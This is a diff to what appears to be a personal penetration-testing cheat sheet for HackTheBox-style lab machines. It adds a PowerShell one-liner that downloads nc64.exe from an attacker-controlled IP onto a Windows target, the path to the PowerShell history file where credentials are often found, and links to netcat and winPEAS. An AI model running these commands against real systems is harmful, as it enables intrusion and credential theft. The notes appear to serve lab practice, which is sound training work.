@@ -17,7 +17,11 @@ l : Listening mode.
 v : Verbose mode. Displays status messages in more detail.
 n : Numeric-only IP address. No hostname resolution. DNS is not being used.
 p : Port. Use to specify a particular port for listening
-smbclient  \\\\10.10.10.131\\ADMIN$ -U Administrator
+netCat for windows:
+ "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.9/nc64.exe -outfile nc64.exe" 
+
+ 
+ smbclient  \\\\10.10.10.131\\ADMIN$ -U Administrator
 
 
 Nmap stuff ################################################################
@@ -57,6 +61,8 @@ Connect to remote desktop using xfreerdp:
 WinRM evel:
 evil-winrm -i 10.129.136.91 -u administrator -p badminton
 
+windows console history:
+C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline
 
 
 Redis connect:
@@ -110,3 +116,8 @@ https://github.com/SecureAuthCorp/impacket
     python3 mssqlclient.py -h
     python3 mssqlclient.py ARCHETYPE/sql_svc@{TARGET_IP} -windows-auth
 https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
+Netcat windows:
+ https://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post_page-----a2ddc3557403----------------------
+Windows privalage escalation:
+https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe
+
